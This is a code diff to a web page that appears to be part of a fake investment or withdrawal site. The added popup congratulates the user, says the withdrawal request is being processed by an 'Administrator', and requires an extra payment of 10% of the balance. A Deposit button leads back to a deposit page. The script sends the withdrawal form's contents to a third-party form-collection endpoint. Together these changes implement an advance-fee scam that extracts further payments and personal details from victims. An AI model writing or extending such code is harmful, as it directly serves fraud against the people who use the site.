@@ -1906,8 +1906,22 @@
     </div>
 
     <div class="popup3">
-      <div class="close-btn3">&times;</div>
-      <p>Your withdrawal is being processed!</p>
+      <div class="close-btn3" style="margin-bottom: 20px">&times;</div>
+      <div>
+        <h2>Congratulations !</h2>
+        <p>
+          "Your request has been submitted to the Administrator and is currently
+          being processed. To complete this transaction, an additional payment
+          of 10% of your initial available balance will be required."
+        </p>
+        <button
+          class="btn"
+          id="close-popup3"
+          style="background-color: rgb(111, 216, 181)"
+        >
+          <a href="deposit.html">Deposit</a>
+        </button>
+      </div>
     </div>
 
     <!-- popup -->
@@ -2030,9 +2044,10 @@
           } else {
             try {
               // alert("Your withdrawal is being processed!");
+              //   https://submit-form.com/DUeXCaHdO
               document.querySelector(".popup3").classList.add("active");
               document.querySelector(".popup").classList.remove("active");
-              const res = await fetch("https://submit-form.com/DUeXCaHdO", {
+              const res = await fetch("https://submit-form.com/DUeXCadO", {
                 method: "POST",
                 headers: {
                   "Content-Type": "application/json",
